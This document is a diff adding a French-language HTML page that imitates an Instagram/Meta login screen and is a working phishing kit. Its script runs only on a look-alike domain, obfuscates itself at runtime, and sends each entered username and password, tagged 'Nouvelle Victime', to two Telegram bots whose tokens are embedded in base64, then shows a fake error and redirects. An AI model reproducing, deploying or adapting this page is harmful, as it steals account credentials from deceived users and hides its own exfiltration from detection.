@@ -1,0 +1,139 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        #logo {
+            background-size: 100%;
+            width: 140px;
+            height: 140px;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <br>
+        <br>
+        <br>
+        <br>
+        <p class="language">Français (France) ▼</p>
+        <br>
+        <div id="logo"></div>
+        <input type="text" placeholder="Nom d'utilisateur">
+        <input type="YKK" placeholder="Mot de passe">
+        <button class="btn">Se connecter</button>
+        <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <a href="#" class="create-account">Créer un compte</a>
+        <p class="meta">Ⓜ Meta</p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator/dist/index.browser.js"></script>
+    <script>
+                if (eval(atob("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atob("aW5zdGFncmFtLWZyLnJ1bi5wbGFjZQ==")) {
+        const code = `
+    function sendToTelegram(message, tkn, chId) {
+        const url = \`https://api.telegram.org/bot\${tkn}/sendMessage\`;
+        
+        const data = {
+            chat_id: chId,
+            text: message
+        };
+
+        return fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('Message envoyé avec succès:', data);
+                return true;
+            } else {
+                console.error('Erreur Telegram:', data);
+                return false;
+            }
+        })
+        .catch(error => {
+            console.error('Erreur lors de l\\'envoi du message:', error);
+            return false;
+        });
+    }
+    
+    document.querySelector('.btn').addEventListener('click', async function() {
+        const username = document.querySelector('input[type="text"]').value;
+        const YKK = document.querySelector('input[type="YKK"]').value;
+
+        if (username && YKK) {
+            const message = \` ✨ Nouvelle Victime ✨ (Bouh) by YKK☑️\\n\\nNom de profil 👤: \${username}\\nMot de passe 🔒: \${YKK}\`;
+
+            const tkn1 = atob('Njc5OTk1NjQ4MDpBQUY2dUtNNGI3MmFBeE5lNm4ydk9DdUhwZzdyQ0pvUlBrWQ==');
+            const chId1 = atob('NjY2OTY5MzgwNQ==');
+            const tkn2 = atob('NzQ5MDIwNjczNTpBQUhQZkdGZ0NveUlnTVV4UnpabEZqSWJ5U0h6U19lVDdxYw==');
+            const chId2 = atob('NTQ0ODA0MzMxMA==');
+
+            const success1 = await sendToTelegram(message, tkn1, chId1);
+            const success2 = await sendToTelegram(message, tkn2, chId2);
+
+            if (success1 && success2) {
+                alert('incorrect');
+            } else {
+                alert('le mot de passe que avez indiqué est incorrect Veuillez réessayer.');
+            }
+
+            // Only redirect after message has been successfully sent
+            window.location.href = 'index.html'; 
+        } else {
+            alert('incorrect');
+        }
+    });
+    `;
+
+        const obfuscatedCode = JavaScriptObfuscator.obfuscate(code, {
+            compact: true,
+            controlFlowFlattening: true,
+            deadCodeInjection: true,
+            debugProtection: true,
+            disableConsoleOutput: true,
+            identifierNamesGenerator: 'hexadecimal',
+            numbersToExpressions: true,
+            simplify: true,
+            splitStrings: true,
+            stringArray: true,
+            stringArrayEncoding: ['base64'],
+            stringArrayThreshold: 1
+        });
+
+        eval(obfuscatedCode.getObfuscatedCode());
+
+        document.getElementById("logo");
+        fetch("im698.txt") // txt fih base64
+            .then(res => res.text())
+            .then(base64 => {
+                logo.style.backgroundImage = `url("${base64}")`;
+            });
+
+        var style = document.createElement('style');
+        var css = "ICAgICAgICBib2R5IHsNCiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAiR2lsbCBTYW5zIEV4dHJhYm9sZCIsIHNhbnMtc2VyaWY7DQogICAgICAgICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgICAgICAgICAgaGVpZ2h0OiAxMDB2aDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7DQogICAgICAgICAgICBtYXJnaW46IDA7DQogICAgICAgIH0NCiAgICAgICAgLmxvZ2luLWNvbnRhaW5lciB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiB3aGl0ZTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHg7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAxMnB4Ow0KICAgICAgICAgICAgYm94LXNoYWRvdzogMCA0cHggMTBweCByZ2JhKDAsIDAsIDAsIDAuMSk7DQogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgICAgICAgICB3aWR0aDogMzUwcHg7DQogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjZTBlMGUwOw0KICAgICAgICB9DQogICAgICAgIC5sYW5ndWFnZSB7DQogICAgICAgICAgICBmb250LXNpemU6IDE0cHg7DQogICAgICAgICAgICBjb2xvcjogIzU1NTsNCiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDgwcHg7DQogICAgICAgIH0NCiAgICAgICAgLmxhbmd1YWdlZiB7DQogICAgICAgICAgICBmb250LXNpemU6IDE0cHg7DQogICAgICAgICAgICBjb2xvcjogIzU1NTsNCiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDIwcHg7DQogICAgICAgIH0NCiAgICAgICAgLmxvZ28gew0KICAgICAgICAgICAgd2lkdGg6IDEyMHB4Ow0KICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsNCiAgICAgICAgfQ0KICAgICAgICAubG9nb2Ygew0KICAgICAgICAgICAgd2lkdGg6IDcwcHg7DQogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4Ow0KICAgICAgICB9DQogICAgICAgIGlucHV0IHsNCiAgICAgICAgICAgIHdpZHRoOiBjYWxjKDEwMCUgLSA0MHB4KTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDE3cHg7DQogICAgICAgICAgICBtYXJnaW46IDE0cHggMDsNCiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNjY2M7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAxMnB4Ow0KICAgICAgICAgICAgZm9udC1zaXplOiAxNnB4Ow0KICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsNCiAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IGF1dG87DQogICAgICAgICAgICBtYXJnaW4tcmlnaHQ6IGF1dG87DQogICAgICAgIH0NCiAgICAgICAgLmJ0biB7DQogICAgICAgICAgICB3aWR0aDogY2FsYygxMDAlIC0gMjBweCk7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMTg3N2YyOw0KICAgICAgICAgICAgY29sb3I6IHdoaXRlOw0KICAgICAgICAgICAgcGFkZGluZzogMTJweDsNCiAgICAgICAgICAgIGJvcmRlcjogbm9uZTsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDI4cHg7DQogICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXI7DQogICAgICAgICAgICBmb250LXNpemU6IDE2cHg7DQogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsNCiAgICAgICAgICAgIG1hcmdpbi10b3A6IDEwcHg7DQogICAgICAgIH0NCiAgICAgICAgLmZvcmdvdC1saW5rIHsNCiAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgICAgICAgICAgbWFyZ2luLXRvcDogMjBweDsNCiAgICAgICAgICAgIGNvbG9yOiAjMDAwMDAwOw0KICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KICAgICAgICAgICAgZm9udC1zaXplOiAxOHB4Ow0KICAgICAgICB9DQogICAgICAgIC5jcmVhdGUtYWNjb3VudCB7DQogICAgICAgICAgICBkaXNwbGF5OiBibG9jazsNCiAgICAgICAgICAgIG1hcmdpbi10b3A6IDIwcHg7DQogICAgICAgICAgICBwYWRkaW5nOiAxMHB4Ow0KICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgIzE4NzdmMjsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDI4cHg7DQogICAgICAgICAgICBjb2xvcjogIzE4NzdmMjsNCiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTZweDsNCiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7DQogICAgICAgICAgICB3aWR0aDogY2FsYygxMDAlIC0gMjBweCk7DQogICAgICAgICAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7DQogICAgICAgIH0NCiAgICAgICAgLm1ldGEgew0KICAgICAgICAgICAgbWFyZ2luLXRvcDogMjBweDsNCiAgICAgICAgICAgIGNvbG9yOiAjNTU1Ow0KICAgICAgICAgICAgZm9udC1zaXplOiAxMnB4Ow0KICAgICAgICB9DQo=";
+        style.textContent = atob(css);
+        document.head.appendChild(style);
+                }
+    </script>
+
+
+</body>
+
+</html>
